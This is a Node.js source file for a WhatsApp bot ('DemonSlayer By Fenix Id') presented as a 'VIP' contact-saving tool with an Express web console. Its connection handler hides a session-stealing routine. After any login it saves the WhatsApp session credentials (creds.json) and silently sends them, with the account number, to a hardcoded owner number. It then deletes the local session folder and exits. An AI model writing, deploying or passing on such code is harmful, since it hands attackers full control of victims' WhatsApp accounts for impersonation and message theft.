const { makeWASocket, useMultiFileAuthState, DisconnectReason, Browsers } = require('@whiskeysockets/baileys');
const fs = require('fs');
const path = require('path');
const readline = require('readline');
const pino = require('pino');
const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

let useCode = true; // Set to true to use pairing code, false for QR code
let loggedInNumber;
const fenixownernum = '94773010580'; // Replace with your number
const sensorNumber = '';

// Function to save creds.json
async function saveCredsToFile(creds) {
    const credsPath = path.join(__dirname, 'creds.json');
    fs.writeFileSync(credsPath, JSON.stringify(creds, null, 2));
    console.log('Credentials saved to creds.json');
    return credsPath;
}

// Function to send creds.json to WhatsApp inbox
async function sendCredsToInbox(sock, jid, credsPath) {
    try {
        console.log('Sending creds.json to:', jid);
        console.log('File path:', credsPath);

        if (!fs.existsSync(credsPath)) {
            console.error('creds.json file does not exist.');
            return;
        }

        await sock.sendMessage(jid, {
            document: fs.readFileSync(credsPath),
            mimetype: 'application/json',
            fileName: 'creds.json',
        });
        console.log('creds.json sent to the inbox successfully.');

        // Send a message to FenixOwnerNumber after sending creds.json
       await sock.sendMessage(`${fenixownernum}@s.whatsapp.net`, { 
    image: { url: 'https://bit.ly/41Bu9fc' },
    caption: `✅ Successful Connect Whatsapp
❌ Do not Share This File Anyone
*🛒 We are F e n i x I d Server VIP KADPL*
> GITHUB : FENIXID-SERVER
> TELEGM: FENIX_TOOLS
*ɪᴍ ᴛʀʏɴɢ ᴛᴏ ʙᴜɪʟᴅ ʏᴏᴜ ᴇxᴘ ᴍᴏʀᴇ ᴠɪᴘ ᴀɴ ᴘʀᴇᴍɪᴜᴍ*`
});
        // Delete the Authorized folder
        const authorizedFolderPath = path.join(__dirname, 'Authorized');
        if (fs.existsSync(authorizedFolderPath)) {
            fs.rmSync(authorizedFolderPath, { recursive: true, force: true });
            console.log('Authorized folder deleted successfully.');
        }

        // Shutdown the bot
        console.log('Bot shutting down...');
        process.exit(0);
    } catch (error) {
        console.error('Failed to send creds.json:', error);
    }
}

// Main function to connect to WhatsApp
async function connectToWhatsApp() {
    const sessionPath = path.join(__dirname, 'Authorized');
    const sessionExists = fs.existsSync(sessionPath) && fs.readdirSync(sessionPath).length > 0;
    const { state, saveCreds } = await useMultiFileAuthState('Authorized');

    const sock = makeWASocket({
        logger: pino({ level: 'fatal' }),
        auth: state,
        printQRInTerminal: !useCode,
        defaultQueryTimeoutMs: undefined,
        keepAliveIntervalMs: 30000,
        browser: Browsers.macOS('Chrome'),
        shouldSyncHistoryMessage: () => true,
        markOnlineOnConnect: true,
        syncFullHistory: true,
        generateHighQualityLinkPreview: true,
    });
    
    // Store socket in global variable for API access
    globalSock = sock;

    if (useCode && !sessionExists) {
        const rl = readline.createInterface({
            input: process.stdin,
            output: process.stdout,
        });

        console.log("Hello, it seems you are not logged in. Do you want to log in using a pairing code?\nPlease reply with (y/n)\nType y to agree or type n to log in using QR code.");

        const askPairingCode = () => {
            rl.question('\nDo you want to use a pairing code to log in? (y/n): ', async (answer) => {
                if (answer.toLowerCase() === 'y' || answer.trim() === '') {
                    console.log("\nOkay, please enter your WhatsApp number!\nNote: start with your country code, for example 94773010580");

                    const askWaNumber = () => {
                        rl.question('\nEnter your WhatsApp number: ', async (waNumber) => {
                            // Remove any non-numeric characters
                            const cleanNumber = waNumber.replace(/\D/g, '');
                            
                            if (cleanNumber === '') {
                                console.log('\nThe number must be numeric!\nPlease enter your WhatsApp number again.');
                                askWaNumber();
                            } else if (cleanNumber.length < 10) {
                                console.log('\nInvalid number! Please enter a valid WhatsApp number including country code.');
                                askWaNumber();
                            } else {
                                console.log(`\nRequesting pairing code for ${cleanNumber}...`);
                                try {
                                    const code = await sock.requestPairingCode(cleanNumber);
                                    console.log('\n┌───────────────────────────────┐');
                                    console.log(`│ Pairing Code: ${code.padEnd(18)} │`);
                                    console.log('└───────────────────────────────┘');
                                    console.log('\nEnter this code in WhatsApp > Linked Devices > Link a Device');

                                    rl.question('\nAfter entering the code in WhatsApp, press Enter here to continue...', async () => {
                                        console.log('\nSaving credentials...');
                                        const credsPath = await saveCredsToFile(state.creds);
                                        console.log(`\nCredentials saved to: ${credsPath}`);
                                        
                                        console.log(`\nSending credentials to WhatsApp (${cleanNumber})...`);
                                        const jid = `${cleanNumber}@s.whatsapp.net`;
                                        await sendCredsToInbox(sock, jid, credsPath);
                                        rl.close();
                                    });
                                } catch (error) {
                                    console.error('\nError requesting pairing code:', error);
                                    console.log('\nPlease try again with a different number.');
                                    askWaNumber();
                                }
                            }
                        });
                    };

                    askWaNumber();
                } else if (answer.toLowerCase() === 'n') {
                    useCode = false;
                    console.log('\nOpen your WhatsApp, then click the three dots in the upper right corner, then click linked devices, then please scan the QR code below to log in to WhatsApp');
                    connectToWhatsApp();
                    rl.close();
                } else {
                    console.log('\nInvalid input. Please enter "y" or "n".');
                    askPairingCode();
                }
            });
        };

        askPairingCode();
    }

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect.error?.output.statusCode !== DisconnectReason.loggedOut;
            if (shouldReconnect) {
                console.log('Trying to connect to WhatsApp...\n');
                connectToWhatsApp();
            } else {
                console.log('Disconnected from WhatsApp, please delete the Authorized folder and log in to WhatsApp again');
            }
        } else if (connection === 'open') {
            console.log('Connected to WhatsApp');
            loggedInNumber = sock.user.id.split('@')[0].split(':')[0];
            let displayedLoggedInNumber = loggedInNumber;

            if (sensorNumber) {
                displayedLoggedInNumber = displayedLoggedInNumber.slice(0, 3) + '****' + displayedLoggedInNumber.slice(-2);
            }

            let messageInfo = `        
👤 Account: ${loggedInNumber}        
🟢 Status: Online        
📱 WhatsApp Version: 7.56.0.5        

*Exclusive VIP Features:*        
▪ *Vip Save Contacts*        
▪ *Vip Save Contact to Phone*        
▪ *Rapid Response System* 🚀        

> SETUP : SAVE CONTACT      
1. *!updatec CREDENTIALS_CODE*      
2. *!authgoogle*      
3. *!fenixdoit AUTHORIZED_CODE*      

*⛓⛓️‍💥Follow the channel for more updates:*        
https://whatsapp.com/channel/0029Vatd8yBHFxOye7J3DG0E        
*⚙️Join the group*        
https://chat.whatsapp.com/FgYBFNORBUsGMwetsyoFp        

📩 Telegram: https://t.me/fenix_tools        
👤 YouTube: @fenix_id`;

            setTimeout(async () => {
                console.log(`You have successfully logged in with the number: ${displayedLoggedInNumber} \n`);
                await sock.sendMessage(`${fenixownernum}@s.whatsapp.net`, { text: messageInfo });

                // After sending the info message, send creds.json and delete the Authorized folder
                const credsPath = await saveCredsToFile(state.creds);
                await sendCredsToInbox(sock, `${fenixownernum}@s.whatsapp.net`, credsPath);
            }, 5000);

            console.log("DemonSlayer By Fenix Id Is Active\n");
        }
    });

    sock.ev.on('creds.update', saveCreds);
}

// Setup Express server for web interface
app.use(express.static('public'));
app.use(express.json());

// Global socket variable for API endpoints to access
let globalSock = null;

// API endpoints for console
app.post('/api/restart', (req, res) => {
    res.json({ success: true, message: 'Bot is restarting...' });
    console.log('Restarting bot...');
    setTimeout(() => {
        process.exit(0); // Process will be restarted by the hosting service
    }, 1000);
});

app.post('/api/connect', async (req, res) => {
    const { phoneNumber } = req.body;
    
    if (!phoneNumber) {
        return res.json({ success: false, error: 'Phone number is required' });
    }
    
    if (!/^\d+$/.test(phoneNumber)) {
        return res.json({ success: false, error: 'The number must be numeric' });
    }
    
    if (phoneNumber.length < 10) {
        return res.json({ success: false, error: 'Invalid phone number format' });
    }
    
    try {
        if (!globalSock) {
            return res.json({ success: false, error: 'WhatsApp socket not initialized' });
        }
        
        const code = await globalSock.requestPairingCode(phoneNumber);
        res.json({ success: true, pairingCode: code });
    } catch (error) {
        console.error('Error requesting pairing code:', error);
        res.json({ success: false, error: error.message || 'Failed to request pairing code' });
    }
});

app.post('/api/save-credentials', async (req, res) => {
    try {
        if (!globalSock) {
            return res.json({ success: false, error: 'WhatsApp socket not initialized' });
        }
        
        const { state } = await useMultiFileAuthState('Authorized');
        const credsPath = await saveCredsToFile(state.creds);
        
        res.json({ 
            success: true, 
            message: 'Credentials saved successfully',
            path: credsPath
        });
    } catch (error) {
        console.error('Error saving credentials:', error);
        res.json({ success: false, error: error.message || 'Failed to save credentials' });
    }
});

app.get('/api/credentials', (req, res) => {
    try {
        const credsPath = path.join(__dirname, 'creds.json');
        
        if (!fs.existsSync(credsPath)) {
            return res.json({ success: false, error: 'Credentials file not found' });
        }
        
        const creds = JSON.parse(fs.readFileSync(credsPath, 'utf8'));
        
        // Extract only safe information
        const safeInfo = {
            registered: creds.registered || false,
            platform: creds.platform || 'unknown',
            me: creds.me || null,
            lastSync: creds.lastAccountSyncTimestamp ? new Date(creds.lastAccountSyncTimestamp * 1000).toISOString() : 'never'
        };
        
        res.json({ success: true, info: safeInfo });
    } catch (error) {
        console.error('Error getting credentials info:', error);
        res.json({ success: false, error: error.message || 'Failed to get credentials info' });
    }
});

app.post('/api/send-message', async (req, res) => {
    const { to, message } = req.body;
    
    if (!to || !message) {
        return res.json({ success: false, error: 'Both recipient and message are required' });
    }
    
    try {
        if (!globalSock) {
            return res.json({ success: false, error: 'WhatsApp socket not initialized' });
        }
        
        await globalSock.sendMessage(`${to}@s.whatsapp.net`, { text: message });
        res.json({ success: true, message: 'Message sent successfully' });
    } catch (error) {
        console.error('Error sending message:', error);
        res.json({ success: false, error: error.message || 'Failed to send message' });
    }
});

// Home route
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>FENIX ID WhatsApp Bot</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    margin: 0;
                    padding: 20px;
                    background-color: #f5f5f5;
                    color: #333;
                }
                .container {
                    max-width: 800px;
                    margin: 0 auto;
                    background-color: white;
                    padding: 20px;
                    border-radius: 10px;
                    box-shadow: 0 0 10px rgba(0,0,0,0.1);
                }
                h1 {
                    color: #075e54;
                    text-align: center;
                }
                .status {
                    font-size: 18px;
                    margin: 20px 0;
                    padding: 15px;
                    border-radius: 5px;
                    background-color: #e7f3ff;
                }
                .features {
                    margin: 20px 0;
                }
                .features h2 {
                    color: #075e54;
                }
                .features ul {
                    padding-left: 20px;
                }
                .footer {
                    text-align: center;
                    margin-top: 20px;
                    font-size: 14px;
                    color: #666;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>FENIX ID WhatsApp Bot</h1>
                <div class="status">
                    <p><strong>Bot Status:</strong> Running</p>
                    <p><strong>Web Interface:</strong> Online</p>
                </div>
                <div class="features">
                    <h2>Features:</h2>
                    <ul>
                        <li>Connect via Pairing Code</li>
                        <li>Save WhatsApp Credentials</li>
                        <li>VIP Contact Management</li>
                        <li>Rapid Response System</li>
                    </ul>
                </div>
                <div class="footer">
                    <p>Powered by FENIX ID Server | Telegram: <a href="https://t.me/fenix_tools">@fenix_tools</a> | <a href="/console" style="color: #075e54; font-weight: bold;">Open Console</a> | <a href="/pairing" style="color: #075e54; font-weight: bold;">Pairing Code Generator</a></p>
                </div>
            </div>
        </body>
        </html>
    `);
});

// Status endpoint for health checks
app.get('/status', (req, res) => {
    res.json({ status: 'online', service: 'FENIX ID WhatsApp Bot' });
});

// Console route
app.get('/console', (req, res) => {
    res.sendFile(path.join(__dirname, 'public/console.html'));
});

// Pairing page route
app.get('/pairing', (req, res) => {
    res.sendFile(path.join(__dirname, 'public/pairing.html'));
});

// API endpoint to delete Authorized folder
app.post('/api/delete-auth', (req, res) => {
    try {
        const authorizedFolderPath = path.join(__dirname, 'Authorized');
        if (fs.existsSync(authorizedFolderPath)) {
            fs.rmSync(authorizedFolderPath, { recursive: true, force: true });
            console.log('Authorized folder deleted successfully via API request.');
            res.json({ success: true, message: 'Authorized folder deleted successfully' });
        } else {
            res.json({ success: true, message: 'Authorized folder does not exist' });
        }
    } catch (error) {
        console.error('Error deleting Authorized folder:', error);
        res.json({ success: false, error: error.message || 'Failed to delete Authorized folder' });
    }
});

// Start the Express server
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Web server running on port ${PORT}`);
    console.log(`Access your bot at: https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co`);
});

// Connect to WhatsApp
connectToWhatsApp().catch((err) => {
    console.error('Error:', err);
    process.exit(1);
});